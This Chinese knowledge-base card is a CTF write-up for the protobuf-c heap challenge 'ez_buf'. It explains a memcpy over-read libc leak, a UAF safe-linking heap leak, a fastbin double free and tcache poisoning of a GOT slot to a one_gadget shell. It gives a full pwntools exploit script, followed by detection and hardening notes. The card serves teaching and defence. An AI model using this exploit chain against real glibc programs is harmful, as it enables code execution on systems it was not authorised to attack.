---
id: binary-pwn-heap-protobuf-ez-buf-memcpy-overread-tcache-safelink-got-onegadget
title: protobuf 堆题 ez_buf：固定 0x30 memcpy 过读泄 libc、UAF 泄 safe-linked tcache 得堆基址，fastbin double free 后毒化 tcache 到 GOT 写 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: protobuf-memcpy-overread-tcache-safelink-got-onegadget
aliases:
- 2024ciscn ez_buf
- protobuf-c 堆题 ez_buf
- memcpy 固定长度过读
- show UAF 泄堆
- fastbin double free 绕 tcache
- safe-linking tcache 毒化 GOT
- ABS@got one_gadget
tags:
- pwn
- heap
- protobuf
- protobuf-c
- memcpy-overread
- uaf
- double-free
- fastbin
- tcache
- safe-linking
- got-hijack
- one-gadget
- glibc
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V363
  verified_at: '2026-11-09T03:27:04+08:00'
  notes: 已对照原文与 17 张截图核对：sub_1934 六参数壳与 add(a4,a1,a2)/delete(a4)/show 映射、add 的 idx>8 截断与 malloc(0x30)+memcpy(...,a3,0x30)、源 bytes 块 8 字节有效数据后跟 main_arena+96 残留（图12）、show 输出 bbbbbbbb+6 字节指针且 libc_base=leak-0x21ace0（图11）、tcache 0x40[7] 填满后 delete(7)/delete(8)/delete(7) 形成 fastbin 0x40 循环（图14）、7 次 add 清空 tcache 后 tcache 链尾为 *ABS@got.plt（图16）、发送 ls 得到目录回显（图17）均与卡片一致。未验证点：原文 PoC 未实际执行；ABS 变量 0x21a098、实际写入 ABS+8（即图16 的 libc+0x21a0a0 GOT 项）与 one_gadget 0x10d9ca 依赖题目 libc，卡片已注明迁移需重查；『发送 ls 触发被覆盖函数指针』的调用点原文未展开。颗粒度：单条利用链（过读泄 libc→UAF 泄堆→fastbin dup→tcache 毒化 GOT），顺序阶段非独立动作，未拆分；skipped 的 protobuf-c 协议逆向已有 verified 卡 code-analysis-reverse-linux-protobuf-c-descriptor-recovery，跳过合理。dedup 首候选为自身，related 的 10-free-quota-fastbin-dup-strtok-got-system（同为 2.35 fastbin dup 打 abs GOT，但 free 次数写死 10、目标 strtok 槽+system）与 protobuf-c-free-overlap-fsop-orw（overlap+FSOP+ORW）为不同题目/链路，保留两卡并列；dup-scan 早于建卡且无本卡 pair。
---

## 一句话结论

在 protobuf-c 驱动的 add/show/delete 笔记题里，add 用固定 `0x30` 字节 `memcpy` 从一个只装 8 字节数据的 protobuf `bytes` 块（0x20 源块）拷贝，会越过源块读到残留的 smallbin `main_arena` 指针并写进 0x30 目标块，show 即泄 libc；delete 只 free 不置空槽位造成 UAF，show 已释放块可读 safe-linking 编码的 tcache `fd` 反推堆基址；随后填满 tcache 后对同一索引 double free 进 fastbin，清空 tcache 再借 fastbin 取块时把毒化 `fd` 写入仍在链上的副本，把下一次 malloc 引到 GOT 并写入 one_gadget，发送输入触发即拿 shell。

## 原理

- **protobuf-c 的额外分配**：消息解包时 `bytes` 字段按长度分配独立数据块（8 字节数据 → 0x20 chunk），消息结构体本身也有分配；业务 `add` 再把 `whatcon` 数据 `memcpy` 到自己的 0x30 块。一次 add 实际出现“源 bytes 块 + 目标业务块”两个堆块。
- **固定长度 memcpy 过读泄 libc**：`add` 的 `memcpy(qword_C0A0[v5], a3, 0x30)` 长度写死 0x30，而 `a3` 指向的 protobuf bytes 数据块（0x20 大小）只有 8 字节有效数据；`memcpy` 会把源块后续 0x28 字节的残留内容一并复制。题目初始堆里本就存在一个从 smallbin 切分、带 `main_arena+96` 指针的 0x20 块（0xd0 smallbin 块被复用），于是 0x30 目标块中 8 字节内容之后带着 6 字节 libc 指针；`show` 把 0x30 块按字符串输出时直接泄露，`libc_base = leak - 0x21ace0`（该偏移即 `main_arena+96`）。
- **delete 不置空造成 UAF/重复释放**：`delete(idx)` 只 `free(qword_C0A0[idx])`，不清零指针；`show` 看到槽位非空就继续读，因此可以读已释放 chunk。释放的 0x40 块进入 tcache 后，首 8 字节是 safe-linking 编码的 `fd = next ^ (chunk_addr >> 12)`；show 读出后按 `heap = (leak << 12) - 0x4000` 反推堆基址（0x4000 是目标块相对堆基址的偏移），并得到 `key = heap >> 12` 用于后续编码。
- **填满 tcache 后 fastbin double free**：tcache 0x40 bin 默认上限 7 个。先 free 索引 6..0 的七个 0x40 块填满 tcache；再执行 `delete(7)`、`delete(8)`、`delete(7)`：前两次释放进入 fastbin，第二次释放 7 时 fastbin 头是 8，不等于 7，绕过了 fastbin 的 double-free 检查，形成 7→8→7 的循环链表。
- **清空 tcache 与毒化**：连续 7 次 add 消耗掉 tcache 里的 7 个 0x40 块；随后 `add(0, payload)` 触发 malloc 从 fastbin 取块，并会把 fastbin 中一批块灌入 tcache。由于 double free 循环，返回给用户的块与 tcache 链上的副本重叠，`payload` 写入的 `fd` 会被后续 malloc 当作 tcache 下一项。`fd` 需按 safe-linking 编码：`target ^ (chunk_addr >> 12)`，其中 `chunk_addr = heap + 0x4000`，即 `key + 4`。
- **毒化目标与触发**：文章把目标设为 libc 内的 `ABS@got`（`libc_base + 0x21a098`，实际写入 `ABS + 8`），毒化后 `add(1)`、`add(2)` 消耗链上前两个堆块，`add(3, p64(og)*4)` 让 malloc 返回目标地址并把 one_gadget（`libc_base + 0x10d9ca`）写到 `ABS+8` 起的 4 个槽；发送 `ls` 时程序调用该函数指针，命中 one_gadget 得到 shell（文章最终拿到命令执行回显）。
- **偏移依赖**：`main_arena+96 = 0x21ace0`、`ABS@got = 0x21a098`、one_gadget `0x10d9ca` 都取自题目 libc；换 libc 必须重新确认（尤其 one_gadget 约束）。
- **索引处理细节**：`add` 里 `v5 = idx; if (v5 > 8) v5 = 8;` 把大于 8 的索引截到 8，因此循环申请 1..9 时最后一个会覆盖 8 号槽且不释放旧块；利用脚本正是借助该行为铺设多个 0x40 块。

## 触发条件

- 目标为 protobuf-c 协议驱动的菜单程序（示例字段 `whatcon=bytes`、`whattodo/idx/size=sint64`），能通过消息字段控制索引与写入内容。
- `add` 使用固定长度 `memcpy`（示例 0x30），而 protobuf `bytes` 字段可只给更短数据（示例 8 字节），形成源块过读。
- `delete` 释放后不清空槽位，`show` 能按索引读出已释放块内容（UAF）。
- glibc 启用 tcache 与 safe-linking（2.32+；示例 libc 的 `main_arena` 偏移 0x21ac80 一类），且 fastbin double-free 检查只比较链表头。
- 存在可写且会被调用的函数指针槽（GOT/relocation slot 等）；程序未用 seccomp 限制 execve 时可直接 one_gadget。
- 已恢复 `.proto` 并能用 pb2 序列化发包（描述符逆向方法见关联卡片）。

## 利用步骤

1. **恢复协议**：按 `ProtobufCMessageDescriptor` 魔数/字段描述符表恢复 `.proto`（字段名、编号、label、类型），`protoc --python_out` 生成 pb2；封装 `add(idx,data)/delete(idx)/show(idx)` 三个发包函数。
2. **泄 libc**：`add(0, b'b'*8)` 后 `show(0)`，接收 `Content:bbbbbbbb` 之后的 6 字节指针，`libc_base = u64(leak.ljust(8,b'\x00')) - 0x21ace0`。
3. **泄堆**：批量 add 出多个块，`delete` 索引 6..0 填满 tcache；`show(6)` 读释放块首 8 字节（safe-linked fd），`heap = (u64(recv(5).ljust(8,b'\x00')) << 12) - 0x4000`。
4. **fastbin double free**：`delete(7)`、`delete(8)`、`delete(7)`（tcache 已满，释放进入 fastbin；中间隔一个 8 绕过头部检查）。
5. **清空 tcache**：连续 7 次 `add(i, b'a'*8)` 吃掉 tcache 中的 7 个 0x40 块。
6. **毒化 tcache 到目标**：`key = heap >> 12`，`payload = p64((ABS + 8) ^ (key + 4))`，`add(0, payload)` 写入毒化 fd。
7. **写 one_gadget**：`add(1, ...)`、`add(2, ...)` 消耗前两个链项，`add(3, p64(og)*4)` 返回目标地址并写入 one_gadget；发送 `ls` 触发被覆盖的函数指针。

## PoC

```python
# ctf.proto（由二进制描述符恢复）
# syntax = "proto2"; package Devicemsg;
# message pwn {
#   optional bytes  whatcon  = 1;
#   optional sint64 whattodo = 2;
#   optional sint64 whatidx  = 3;
#   optional sint64 whatsize = 4;
#   optional sint32 whatsthis= 5;
# }

from pwn import *
import ctf_pb2

p = process('./pwn')
elf, libc = ELF('./pwn'), ELF('./libc.so.6')

def send_msg(con, todo, idx):
    m = ctf_pb2.pwn()
    m.whatcon, m.whattodo, m.whatidx = con, todo, idx
    m.whatsize, m.whatsthis = 0, 0
    p.sendafter(b"WANT?\n", m.SerializeToString())

def add(idx, data):   send_msg(data, 1, idx)
def delete(idx):      send_msg(b"0", 2, idx)
def show(idx):        send_msg(b"0", 3, idx)

# 1) 固定 0x30 memcpy 从 8 字节 protobuf bytes 块过读，泄露 smallbin 中的 main_arena+96
add(0, b'b' * 8)
show(0)
p.recvuntil(b'Content:bbbbbbbb')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0

# 2) 填充/释放制造 tcache，show 已释放块读 safe-linked fd 得堆基址
for i in range(9):
    add(i + 1, b'b' * 8)
for i in range(7):
    delete(6 - i)
show(6)
p.recvuntil(b'Content:')
heap = (u64(p.recv(5).ljust(8, b'\x00')) << 12) - 0x4000
key = heap >> 12

# 3) tcache 满后对 7 号块 double free 进 fastbin
delete(7); delete(8); delete(7)

# 4) 清空 tcache 0x40，再毒化 fd 指向 libc 内 ABS@got+8（safe-linking 编码）
for i in range(7):
    add(i, b'a' * 8)
ABS = libc_base + 0x21a098
add(0, p64((ABS + 8) ^ (key + 4)))

# 5) 两次常规分配后，第三次拿到目标地址并写 one_gadget
add(1, b'a' * 8)
add(2, b'a' * 8)
og = libc_base + 0x10d9ca
add(3, p64(og) * 4)

p.sendline('ls')   # 触发被覆盖的函数指针
p.interactive()
```

关键状态：释放后 `show(6)` 输出的 5 字节即为 `fd` 的 safe-linking 编码；`key = heap >> 12`、目标块位于 `heap + 0x4000` 故编码键为 `key + 4`；毒化后 tcache 0x40 链尾为目标地址，第三次 add 返回目标并写入 one_gadget。

## 变体与关联

- **泄漏源变体**：固定长度 `memcpy`/`strcpy`/`read` 从变长 protobuf `bytes`、string 或内部临时块复制，都会造成过读；只要目标对象后面残留 libc/堆指针，就能借 show 输出。
- **收尾变体**：若目标没有可用的 GOT 或开启了 Full RELRO，可改打 `__free_hook`/`_IO_list_all`/exit handler；若 seccomp 禁 execve，需要 ORW（见关联的两张 protobuf 堆卡）。
- **double free 变体**：tcache 满后进入 fastbin 是绕过 tcache double-free 检查的常见手法；也有直接在 tcache 链上构造重复项的做法（需处理 safe-linking）。
- **协议逆向**：protobuf-c 描述符恢复已有专门卡片 [[code-analysis-reverse-linux-protobuf-c-descriptor-recovery]]，本卡只把生成的 pb2 当作发包工具。
- **关联**：[[binary-pwn-heap-protobuf-c-free-overlap-fsop-orw]]（protobuf-c free/overlap → `_IO_list_all` fake wide FILE → ORW）、[[binary-pwn-heap-protobuf-free-zero-wrong-slot-uaf-freehook-mprotect-shellcode]]（free 清零写错偏移的稳定 UAF → `__free_hook` → setcontext → mprotect shellcode）。

## 检测与防御

- **代码审计**：重点看 `memcpy(dst, src, 常量)` 且 `src` 来自 protobuf `bytes`/string 的可变长度数据；`free` 后未置空指针；索引超过上限被截断后覆盖旧槽位。
- **加固**：`memcpy` 长度取实际字段长度并校验上界；free 后立即置空槽位；GOT 使用 Full RELRO、开启 PIE；启用 glibc 的 tcache/safe-linking 只能提高门槛，无法修复 UAF/重复释放。
- **检测特征**：tcache/fastbin 链中出现指向 GOT/只读段的指针；同一堆块在释放链中重复出现；分配返回非堆地址。
- **CTF 识别**：protobuf-c + add/show/delete 菜单 + 固定长度复制，先找过读泄漏，再考虑 tcache 毒化；注意 `idx > 上限` 的截断行为。
